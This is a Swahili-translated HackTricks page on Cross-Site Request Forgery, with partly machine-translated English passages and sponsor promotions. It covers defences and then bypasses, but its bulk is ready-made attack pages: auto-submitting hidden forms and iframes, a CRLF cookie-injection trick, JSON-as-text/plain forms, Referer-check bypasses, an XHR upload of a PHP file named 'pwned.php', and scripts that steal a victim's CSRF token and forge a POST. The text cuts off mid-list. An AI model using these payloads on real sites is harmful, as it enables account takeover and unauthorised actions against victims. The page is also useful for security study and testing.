# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho ya Kudukua**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za kudukua

**Habari za Kudukua za Wakati Halisi**\
Endelea kuwa na habari za haraka katika ulimwengu wa kudukua kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari za hivi karibuni kuhusu uzinduzi wa tuzo za mdudu na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!


## Maelezo ya Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** ni aina ya udhaifu wa usalama unaopatikana kwenye programu za wavuti. Inawezesha wadukuzi kutekeleza vitendo kwa niaba ya watumiaji wasio na shaka kwa kudukua vikao vyao vilivyothibitishwa. Shambulio linatekelezwa wakati mtumiaji, ambaye ameingia kwenye jukwaa la mwathirika, anatembelea tovuti yenye nia mbaya. Tovuti hii kisha inazindua maombi kwenye akaunti ya mwathirika kupitia njia kama kutekeleza JavaScript, kuwasilisha fomu, au kupata picha.

### Masharti ya Shambulio la CSRF
Ili kudukua udhaifu wa CSRF, hali kadhaa lazima zikutane:

1. **Tambua Kitendo Chenye Thamani**: Mshambuliaji lazima atafute kitendo kinachofaa kudukuliwa, kama vile kubadilisha nenosiri la mtumiaji, barua pepe, au kuinua mamlaka.
2. **Usimamizi wa Kikao**: Kikao cha mtumiaji kinapaswa kusimamiwa tu kupitia kuki au kichwa cha Uthibitishaji wa Msingi wa HTTP, kwani vichwa vingine haviwezi kudhibitiwa kwa kusudi hili.
3. **Kutokuwepo kwa Vigezo Visivyotabirika**: Ombi halipaswi kuwa na vigezo visivyotabirika, kwani vinaweza kuzuia shambulio.

### Ulinzi Dhidi ya CSRF
Mbinu kadhaa za kuzuia zinaweza kutekelezwa ili kulinda dhidi ya mashambulio ya CSRF:

* [**Vidakuzi vya SameSite**](hacking-with-cookies/#samesite): Tabia hii inazuia kivinjari kutuma vidakuzi pamoja na maombi kutoka kwenye tovuti nyingine. [Zaidi kuhusu Vidakuzi vya SameSite](hacking-with-cookies/#samesite).
* [**Kugawana rasilimali kati ya asili**](cors-bypass.md): Sera ya CORS ya tovuti ya mwathirika inaweza kuathiri uwezekano wa shambulio, hasa ikiwa shambulio linahitaji kusoma majibu kutoka kwenye tovuti ya mwathirika. [Jifunze kuhusu kuvuka CORS](cors-bypass.md).
* **Uhakiki wa Mtumiaji**: Kuuliza nenosiri la mtumiaji au kutatua captcha kunaweza kuthibitisha nia ya mtumiaji.
* **Kuangalia Vichwa vya Referrer au Origin**: Kuthibitisha vichwa hivi kunaweza kusaidia kuhakikisha maombi yanatoka kwenye vyanzo vya kuaminika. Walakini, uundaji wa makini wa URL unaweza kuzunguka ukaguzi usio sahihi, kama vile:
- Kutumia `http://mal.net?orig=http://example.com` (URL inaishia na URL ya kuaminika)
- Kutumia `http://example.com.mal.net` (URL inaanza na URL ya kuaminika)
* **Kubadilisha Majina ya Vigezo**: Kubadilisha majina ya vigezo katika maombi ya POST au GET kunaweza kusaidia kuzuia mashambulio ya otomatiki.
* **Vidakuzi vya CSRF**: Kuingiza kitambulisho cha kipekee cha CSRF katika kila kikao na kuhitaji kitambulisho hiki katika maombi yanayofuata kunaweza kupunguza hatari ya CSRF kwa kiasi kikubwa. Ufanisi wa kitambulisho unaweza kuimarishwa kwa kutekeleza CORS.

Kuelewa na kutekeleza ulinzi huu ni muhimu kwa kudumisha usalama na uadilifu wa programu za wavuti.

## Mabao ya Ulinzi

### Kutoka POST hadi GET

Labda fomu unayotaka kutumia ni tayari kupeleka ombi la **POST na kitambulisho cha CSRF lakini**, unapaswa **kuchunguza** ikiwa **GET** pia ni **sahihi** na ikiwa unapotuma ombi la GET kitambulisho cha CSRF bado kinathibitishwa.

### Kutokuwepo kwa kitambulisho

Programu inaweza kutekeleza mfumo wa **kuthibitisha vitambulisho** wakati vinapokuwepo. Walakini, udhaifu unatokea ikiwa uthibitishaji unapuuzwa kabisa wakati kitambulisho hakipo. Wadukuzi wanaweza kudukua hii kwa **kuondoa parameter** inayobeba kitambulisho, sio tu thamani yake. Hii inawaruhusu kuzunguka mchakato wa uthibitishaji na kutekeleza shambulio la Cross-Site Request Forgery (CSRF) kwa ufanisi.

### Kitambulisho cha CSRF hakijafungwa na kikao cha mtumiaji

Programu **isiofunga vitambulisho vya CSRF kwa vikao vya mtumiaji** inaleta hatari kubwa ya usalama. Mifumo hii inathibitisha vitambulisho dhidi ya **kundi la kimataifa** badala ya kuhakikisha kila kitambulisho kimefungwa kwenye kikao kinachoanzisha.

Hapa ndivyo wadukuzi wanavyotumia hii:

1. **Thibitisha** kwa kutumia akaunti yao wenyewe.
2. **Pata kitambulisho halali cha CSRF** kutoka kwenye kundi la kimataifa.
3. **Tumia kitambulisho hiki** katika shambulio la CSRF dhidi ya mwathirika.

Udhaifu huu unaruhusu wadukuzi kufanya maombi yasiyoruhusiwa kwa niaba ya mwathirika, kwa kudukua mfumo wa uthibitishaji wa kitambulisho usiofaa wa programu.

### Kuzidiwa kwa njia

Ikiwa ombi linatumia njia "**isio ya k
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Tafadhali kumbuka kuwa ikiwa **csrf token inahusiana na kuki ya kikao, shambulio hili halitafanya kazi** kwa sababu utahitaji kuweka kikao cha mwathiriwa, na kwa hivyo utakuwa unajihami mwenyewe.
{% endhint %}

### Badilisha Aina ya Yaliyomo (Content-Type)

Kulingana na [**hii**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), ili **kuepuka ombi la awali** kwa kutumia njia ya **POST**, hizi ni thamani zinazoruhusiwa za Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Hata hivyo, kumbuka kuwa **mantiki ya seva inaweza kutofautiana** kulingana na **Content-Type** uliyotumia, kwa hivyo unapaswa kujaribu thamani zilizotajwa na nyingine kama **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Mfano (kutoka [hapa](https://brycec.me/posts/corctf\_2021\_challenges)) wa kutuma data ya JSON kama text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Kupitisha Ombi la Awali kwa Data ya JSON

Wakati unajaribu kutuma data ya JSON kupitia ombi la POST, kutumia `Content-Type: application/json` katika fomu ya HTML sio rahisi moja kwa moja. Vivyo hivyo, kutumia `XMLHttpRequest` kutuma aina hii ya yaliyomo husababisha ombi la awali. Hata hivyo, kuna mikakati ya kuzidisha kizuizi hiki na kuangalia ikiwa seva inachakata data ya JSON bila kujali Content-Type:

1. **Tumia Aina Mbadala za Yaliyomo**: Tumia `Content-Type: text/plain` au `Content-Type: application/x-www-form-urlencoded` kwa kuweka `enctype="text/plain"` katika fomu. Hatua hii inajaribu ikiwa seva inatumia data bila kujali Content-Type.

2. **Badilisha Aina ya Yaliyomo**: Ili kuepuka ombi la awali wakati huo huo kuhakikisha seva inatambua yaliyomo kama JSON, unaweza kutuma data na `Content-Type: text/plain; application/json`. Hii haisababishi ombi la awali lakini inaweza kuchakatwa kwa usahihi na seva ikiwa imeundwa kukubali `application/json`.

3. **Matumizi ya Faili ya SWF Flash**: Njia isiyo ya kawaida lakini inayowezekana ni kutumia faili ya SWF flash kuzidisha vizuizi kama hivyo. Kwa ufahamu wa kina wa mbinu hii, tazama [chapisho hili](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Kupitisha Ukaguzi wa Referrer / Origin

**Epuka Kichwa cha Referrer**

Programu zinaweza kuthibitisha kichwa cha 'Referer' tu wakati kipo. Ili kuzuia kivinjari kutuma kichwa hiki, unaweza kutumia lebo ya meta ya HTML ifuatayo:
```xml
<meta name="referrer" content="never">
```
Hii inahakikisha kichwa cha 'Referer' kinaachwa, kwa uwezekano wa kuepuka ukaguzi wa uthibitisho katika baadhi ya programu.

**Kuepuka kwa Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Ili kuweka jina la kikoa cha seva katika URL ambayo Referrer itatuma ndani ya vipengele, unaweza kufanya:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Kuipuuza njia ya HEAD**

Sehemu ya kwanza ya [**hii CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) inaelezea kwamba [msimbo wa chanzo wa Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), router imewekwa kushughulikia maombi ya njia ya HEAD kama maombi ya njia ya GET bila mwili wa jibu - njia ya kawaida ambayo sio ya pekee kwa Oak. Badala ya kuhitaji kushughulikia maombi ya njia ya HEAD kwa njia maalum, maombi hayo yanapewa tu kwa kushughulikia maombi ya njia ya GET lakini programu inaondoa mwili wa jibu.

Kwa hiyo, ikiwa maombi ya njia ya GET yanazuiliwa, unaweza tu **kutuma maombi ya njia ya HEAD ambayo yatasindika kama maombi ya njia ya GET**.

## **Mifano ya Kutumia Udhaifu**

### **Kuiba Kitufe cha CSRF**

Ikiwa **kitufe cha CSRF** kinatumika kama **ulinzi**, unaweza kujaribu **kuiba** kwa kutumia udhaifu wa [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) au udhaifu wa [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **Kutumia HTML tags kwa njia ya GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Vivinjari vingine vya HTML5 vinavyoweza kutumika kutuma ombi la GET kiotomatiki ni:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Ombi la Fomu kwa njia ya GET

When a form is submitted using the GET method, the form data is appended to the URL as query parameters. This means that the form data is visible in the URL itself. GET requests are commonly used for simple and idempotent operations, such as retrieving data or performing searches.

Kwa kuwasilisha fomu kwa kutumia njia ya GET, data ya fomu inaongezwa kwenye URL kama vipengele vya utafutaji. Hii inamaanisha kuwa data ya fomu inaonekana kwenye URL yenyewe. Maombi ya GET mara nyingi hutumiwa kwa shughuli rahisi na idempotent, kama kupata data au kufanya utafutaji.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Ombi la POST la Fomu

Ili kutekeleza shambulio la CSRF, tunahitaji kujenga ombi la POST la fomu ambalo litatumwa kwa mtumiaji bila ridhaa yake. Hapa kuna hatua za kufuata:

1. Tengeneza fomu ya HTML ambayo ina vigezo vinavyohitajika na hatua ya lengo.
```html
<form action="https://www.target.com/action" method="POST">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
    <input type="submit" value="Submit">
</form>
```
2. Weka hatua ya lengo kama `action` ya fomu. Hii ni hatua ambayo tunataka ombi la POST lifanyike.
3. Ongeza vigezo vyote vinavyohitajika kama vitambulisho vya siri (`hidden input`) ndani ya fomu. Hii inahakikisha kuwa data inayohitajika inatumwa pamoja na ombi la POST.
4. Ongeza kifungo cha kuwasilisha (`submit button`) ili mtumiaji aweze kubonyeza na kutuma ombi la POST.

Baada ya kutekeleza hatua hizi, fomu itakuwa tayari kutumwa kwa mtumiaji bila ridhaa yake. Wakati mtumiaji anapobonyeza kifungo cha kuwasilisha, ombi la POST litatumwa kwa hatua ya lengo na data iliyowekwa ndani ya fomu itasindika.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Ombi la POST la Fomu kupitia iframe

Ikiwa unataka kufanya ombi la POST la fomu kupitia iframe, unaweza kutumia njia hii ya kudanganya kivinjari cha mtumiaji na kutekeleza shambulio la CSRF (Cross-Site Request Forgery). Hapa kuna hatua za kufuata:

1. Unda ukurasa wa wavuti ambao una fomu ambayo unataka kutuma ombi la POST.
2. Weka iframe kwenye ukurasa huo na elekeza kwenye ukurasa wa lengo ambao unataka kudanganya.
3. Weka fomu ndani ya iframe na weka maelezo yote muhimu kama vitu vya fomu.
4. Tumia JavaScript kwenye ukurasa wa wavuti ili kusababisha fomu kutumwa moja kwa moja baada ya ukurasa kupakia.

Hapa kuna mfano wa namna ya kuunda iframe na kutuma ombi la POST:

```html
<iframe id="csrf-frame" src="https://www.target-website.com"></iframe>

<script>
    window.onload = function() {
        var frame = document.getElementById('csrf-frame');
        var frameDocument = frame.contentDocument || frame.contentWindow.document;
        
        var form = frameDocument.createElement('form');
        form.method = 'POST';
        form.action = 'https://www.target-website.com/post-endpoint';
        
        var input1 = frameDocument.createElement('input');
        input1.type = 'hidden';
        input1.name = 'param1';
        input1.value = 'value1';
        
        var input2 = frameDocument.createElement('input');
        input2.type = 'hidden';
        input2.name = 'param2';
        input2.value = 'value2';
        
        form.appendChild(input1);
        form.appendChild(input2);
        
        frameDocument.body.appendChild(form);
        
        form.submit();
    };
</script>
```

Kumbuka kuwa shambulio la CSRF linaweza kuwa hatari na linaweza kusababisha madhara makubwa. Ni muhimu kuzingatia maadili ya kimaadili na kufuata sheria na kanuni zinazohusiana wakati wa kufanya majaribio ya kuingilia kati.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ombi la POST la Ajax**

Kwa kawaida, maombi ya POST ya Ajax hutumiwa kubadilisha data kwenye seva bila kusasisha ukurasa mzima. Hii inaweza kusababisha shida ya CSRF (Cross-Site Request Forgery) ikiwa hatua sahihi za usalama hazijachukuliwa.

CSRF ni shambulio ambapo mtu mwenye nia mbaya anajaribu kutekeleza hatua fulani kwa niaba ya mtumiaji asiye na habari. Katika kesi ya maombi ya POST ya Ajax, shambulio la CSRF linaweza kufanywa kwa kujenga fomu ya uwongo na kuiwasilisha kiotomatiki kwa seva bila maarifa ya mtumiaji.

Kuna njia kadhaa za kujilinda dhidi ya shambulio la CSRF wakati wa kutumia maombi ya POST ya Ajax. Moja ya njia hizo ni kutumia token ya CSRF. Token ya CSRF ni kipande cha data kinachotumwa na seva kwa kivinjari cha mtumiaji na kisha kurejeshwa na kila ombi la POST. Kwa njia hii, seva inaweza kuthibitisha kuwa ombi linatoka kwa mtumiaji aliyeidhinishwa na sio shambulio la CSRF.

Kwa kumalizia, ni muhimu kuchukua hatua za usalama zinazofaa wakati wa kutumia maombi ya POST ya Ajax ili kuzuia shambulio la CSRF. Matumizi ya token ya CSRF ni njia moja ya kujilinda dhidi ya shambulio hili.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Ombi la POST la multipart/form-data

Kwa kawaida, fomu za mtandao hutumia aina ya maombi ya POST ili kuwasilisha data kwa seva. Aina ya maombi ya POST inayotumiwa mara kwa mara ni `multipart/form-data`. Aina hii ya maombi inaruhusu kuwasilisha data ya fomu pamoja na faili zilizopakiwa.

Kwa kutekeleza shambulio la CSRF (Cross-Site Request Forgery), mshambuliaji anaweza kutumia aina hii ya maombi ya POST kutekeleza vitendo visivyoidhinishwa kwa niaba ya mtumiaji aliyeingia. Shambulio hili linaweza kufanyika kwa kujenga fomu ya bandia na kuilazimisha mtumiaji aliyeingia kuituma.

Kwa mfano, mshambuliaji anaweza kujenga fomu ya bandia inayotuma maombi ya POST ya `multipart/form-data` kwa seva. Fomu hiyo inaweza kuwa na vitu kama vile maeneo ya maandishi, vifungo vya kuchagua faili, na vitu vingine vya fomu. Kwa kuficha fomu hiyo katika tovuti iliyoharibiwa au kwa kutuma kiunga cha kudanganya kupitia barua pepe au mitandao ya kijamii, mshambuliaji anaweza kudanganya mtumiaji aliyeingia kuituma fomu hiyo bila kujua.

Ni muhimu kwa watengenezaji wa wavuti kuchukua hatua za kuzuia shambulio la CSRF kwa kutekeleza njia kama vile kutumia vitambulisho vya CSRF (CSRF tokens) na kuhakikisha kuwa maombi ya POST ya `multipart/form-data` yanathibitishwa kwa usahihi kabla ya kutekeleza vitendo vyovyote.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Ombi la POST la multipart/form-data v2

In this technique, we will explore how to craft a POST request with the `multipart/form-data` content type. This type of request is commonly used when uploading files or submitting forms that contain binary data.

Katika mbinu hii, tutajifunza jinsi ya kuunda ombi la POST lenye aina ya yaliyomo ya `multipart/form-data`. Aina hii ya ombi hutumiwa mara nyingi wakati wa kupakia faili au kuwasilisha fomu zinazojumuisha data ya binary.

#### Anatomy of a `multipart/form-data` POST Request

##### Request Headers

The request headers for a `multipart/form-data` POST request typically include the following:

- `Content-Type`: Set to `multipart/form-data; boundary=<boundary_value>`, where `<boundary_value>` is a unique string used to separate different parts of the request body.

##### Request Body

The request body of a `multipart/form-data` POST request consists of multiple parts, each representing a different field or file to be uploaded. Each part has the following structure:

```
--<boundary_value>
Content-Disposition: form-data; name="<field_name>"; filename="<file_name>"
Content-Type: <file_content_type>

<file_content>
```

- `<boundary_value>`: The same boundary value specified in the `Content-Type` header.
- `<field_name>`: The name of the field or parameter being submitted.
- `<file_name>`: The name of the file being uploaded (if applicable).
- `<file_content_type>`: The MIME type of the file being uploaded (if applicable).
- `<file_content>`: The actual content of the file being uploaded.

Each part is separated by the boundary value, and the request body ends with a final boundary value followed by two hyphens (`--`).

#### Example `multipart/form-data` POST Request

Let's take a look at an example of a `multipart/form-data` POST request:

```
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

john.doe
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

<binary_data_of_picture.jpg>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

In this example, the request is being sent to `example.com/upload`. The request body contains two parts: one for the `username` field and another for the `profile_picture` file. The `Content-Type` of the file is specified as `image/jpeg`, and the actual binary data of the picture is included.

#### Exploiting CSRF with `multipart/form-data` POST Requests

When crafting a CSRF attack using `multipart/form-data` POST requests, the attacker can create a malicious HTML page that automatically submits the form containing the CSRF payload. The payload can be crafted to perform actions on behalf of the victim user, such as changing their password or making unauthorized requests.

By tricking the victim into visiting the malicious page, the attacker can exploit the victim's authenticated session and perform actions without their consent.

To protect against CSRF attacks, it is essential to implement proper CSRF protection mechanisms, such as using anti-CSRF tokens or checking the `Referer` header.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Ombi la POST la Fomu kutoka ndani ya kioo cha iframe

If you want to send a POST request from within an iframe, you can achieve this by creating a hidden form and submitting it programmatically using JavaScript.

Ikiwa unataka kutuma ombi la POST kutoka ndani ya kioo cha iframe, unaweza kufanikisha hili kwa kuunda fomu iliyofichwa na kuwasilisha ombi hilo kwa kutumia JavaScript.

```html
<iframe id="myIframe" src="https://example.com"></iframe>

<script>
  // Get the iframe element
  var iframe = document.getElementById('myIframe');

  // Create a hidden form
  var form = document.createElement('form');
  form.style.display = 'none';
  form.method = 'POST';
  form.action = 'https://example.com/submit';

  // Add form fields
  var input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'field1';
  input1.value = 'value1';
  form.appendChild(input1);

  var input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'field2';
  input2.value = 'value2';
  form.appendChild(input2);

  // Append the form to the iframe's document
  iframe.contentDocument.body.appendChild(form);

  // Submit the form
  form.submit();
</script>
```

This code creates an iframe with the id "myIframe" and sets its source to "https://example.com". It then programmatically creates a hidden form with the method set to POST and the action set to "https://example.com/submit". The form also includes two hidden input fields with their respective names and values. Finally, the form is appended to the iframe's document and submitted.

Nambari hii inaunda kioo cha iframe chenye kitambulisho "myIframe" na kuweka chanzo chake kuwa "https://example.com". Kisha inaunda fomu iliyofichwa kwa kutumia programu na kuweka njia yake kuwa POST na hatua kuwa "https://example.com/submit". Fomu pia inajumuisha uga mbili za kuingiza zilizofichwa na majina na thamani zao mtawaliwa. Hatimaye, fomu inaongezwa kwenye hati ya kioo cha iframe na kuwasilishwa.

Remember that this technique can be used for Cross-Site Request Forgery (CSRF) attacks, so make sure to implement proper security measures to prevent unauthorized requests.

Kumbuka kuwa mbinu hii inaweza kutumika kwa mashambulizi ya Cross-Site Request Forgery (CSRF), kwa hivyo hakikisha kutekeleza hatua sahihi za usalama ili kuzuia maombi yasiyoruhusiwa.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Pora Kitufe cha CSRF na tuma ombi la POST**

To steal a CSRF token and send a POST request, follow these steps:

1. **Identify the CSRF token**: The CSRF token is a unique identifier that is used to prevent Cross-Site Request Forgery attacks. It is usually embedded in the HTML code of a web page.

2. **Inspect the HTML code**: Use the browser's developer tools to inspect the HTML code of the target web page. Look for any input fields or hidden elements that contain the CSRF token.

3. **Extract the CSRF token**: Once you have identified the input field or hidden element that contains the CSRF token, extract the value of the token.

4. **Craft a malicious POST request**: Use a tool like cURL or a browser extension like Postman to craft a POST request to the target website. Include the stolen CSRF token in the request payload.

5. **Send the POST request**: Send the crafted POST request to the target website. If the CSRF token is valid and the request is successful, the server will process the request as if it came from a legitimate source.

By stealing the CSRF token and sending a malicious POST request, an attacker can perform actions on behalf of the victim without their knowledge or consent. It is important for web developers to implement proper CSRF protection mechanisms to prevent such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Chukua Kitufe cha CSRF na tuma ombi la Post kwa kutumia iframe, fomu na Ajax**

Iframe ni kipengele cha HTML kinachoruhusu kuweka ukurasa mwingine ndani ya ukurasa wa wavuti. Unaweza kutumia iframe kuchukua kitufe cha CSRF kutoka kwa ukurasa mwingine na kisha kutuma ombi la Post kwa kutumia kitufe hicho.

Fomu ni kipengele kingine cha HTML kinachotumiwa kwa kuingiza data na kutuma ombi la Post. Unaweza kuunda fomu na kujaza data inayohitajika, pamoja na kitufe cha CSRF, na kisha kutuma ombi la Post.

Ajax ni mbinu ya kutuma ombi la HTTP kwa kutumia JavaScript bila kusababisha ukurasa mzima kupakia upya. Unaweza kutumia Ajax kuchukua kitufe cha CSRF na kutuma ombi la Post kwa kutumia kitufe hicho.

Kwa kuchanganya matumizi ya iframe, fomu, na Ajax, unaweza kuiba kitufe cha CSRF na kutuma ombi la Post kwa njia ya siri. Hii inaweza kusababisha shambulio la CSRF, ambapo ombi la Post linatumiwa bila idhini ya mtumiaji.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Chukua Kitufe cha CSRF na tuma ombi la POST kwa kutumia iframe na fomu**

Ili kuiba Kitufe cha CSRF na kutuma ombi la POST, unaweza kutumia iframe na fomu. Hatua zifuatazo zinaelezea jinsi ya kufanya hivyo:

1. Tafuta ukurasa unaotumia ulinzi wa CSRF na ambapo unataka kuiba Kitufe cha CSRF.
2. Tengeneza ukurasa mpya ambao utatumika kama shambulizi. Unaweza kuita ukurasa huu "attacker.html".
